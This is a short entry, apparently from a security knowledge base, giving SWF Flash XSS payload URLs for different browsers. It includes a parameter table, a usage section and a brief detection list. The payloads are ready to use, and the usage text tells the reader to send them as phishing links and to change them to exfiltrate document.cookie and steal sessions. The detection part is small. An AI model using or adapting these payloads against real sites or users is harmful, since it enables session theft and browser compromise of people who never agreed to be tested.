---
type: code
language: javascript
verified: true
tags:
  - xss
  - swf-flash
  - payload
platforms:
  - web
  - browser
validated: true
---

# SWF-XSS-Demo-Payload-URLs

## Code

```javascript
Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```

## Description

This code snippet contains URL-based payloads for demonstrating XSS exploitation in SWF Flash applications across different browsers. Each line provides a complete URL with a JavaScript injection in the 'js' parameter, tailored to browser-specific behaviors for reliable execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| js | JavaScript payload to inject (e.g., alert or exfiltration code) | alert(document.domain) |
| SWF_BASE_URL | Base URL of the vulnerable SWF file | http://0me.me/demo/xss/xssproject.swf |
| FALLBACK_ACTION | Error handling for IE8 (e.g., redirect) | window.open('?js=history.go(-1)','-self') |
| PAYLOAD_URL | Invalid/target URL for IE9 window.open | invalidfileinvalidfileinvalidfile |
| DELAY_MS | Timeout delay for IE9 setTimeout | 1 |

## Usage

Copy and visit the appropriate URL in the target browser during a social engineering attack (e.g., phishing link) or when testing a vulnerable application. Customize the 'js' parameter with payloads like document.cookie exfiltration to steal session data. Use in red team exercises to simulate drive-by compromises.

## Detection

- Browser pop-ups or unexpected alerts indicating JS execution.
- Network requests to external domains (e.g., attacker.com) from Flash-loaded pages.
- CSP violations or Flash parameter logging in web application firewalls.
- User agent strings showing legacy IE versions accessing SWF files.

## Related

- [[procedures/Exploit-XSS-in-SWF-Flash-Application]]
